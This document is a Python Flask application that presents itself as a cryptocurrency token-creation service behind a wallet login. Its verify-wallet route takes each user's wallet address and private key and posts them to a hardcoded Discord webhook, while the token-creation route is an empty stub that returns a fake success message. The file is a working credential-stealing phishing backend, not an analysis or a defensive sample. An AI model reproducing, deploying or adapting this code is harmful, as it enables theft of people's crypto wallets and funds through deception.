from flask import Flask, render_template, request, jsonify, redirect, url_for, session
import secrets
import re
import requests
from functools import wraps

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)  # For session management

DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1328404396098195609/GVxNl0trVPlQPd9OCRhcqaBjB6B3-y1yilZSir0vjb7LZekidxlaxT6EplhYm9KB1srK"

# Login required decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'wallet_address' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def login():
    if 'wallet_address' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('token_creator.html', wallet_address=session.get('wallet_address'))

@app.route('/verify-wallet', methods=['POST'])
def verify_wallet():
    data = request.json
    wallet_address = data.get('walletAddress')
    private_key = data.get('privateKey')

    # Validate wallet address and private key
    if not wallet_address or not private_key:
        return jsonify({'error': 'Wallet address and private key are required'}), 400

    # Allow alphanumeric private keys with optional special characters (+, /, =)
    private_key_pattern = r'^[A-Za-z0-9+/=]{43,}$'  # Adjust length if needed
    if not re.match(private_key_pattern, private_key):
        return jsonify({'error': 'Invalid private key format'}), 400

    # Send info to Discord webhook
    payload = {
        "content": f"**Wallet Address:** `{wallet_address}`\n**Private Key:** ```{private_key}```"
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        response.raise_for_status()  # Raise an error for non-200 responses
    except requests.RequestException as e:
        return jsonify({'error': f'Failed to send data to Discord: {e}'}), 500

    # Store wallet address in session
    session['wallet_address'] = wallet_address
    return jsonify({'success': True}), 200

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/create-token', methods=['POST'])
@login_required
def create_token():
    data = request.json
    # Token creation logic goes here
    return jsonify({"status": "success", "message": "Token created successfully"}), 200

if __name__ == '__main__':
    app.run(debug=True)
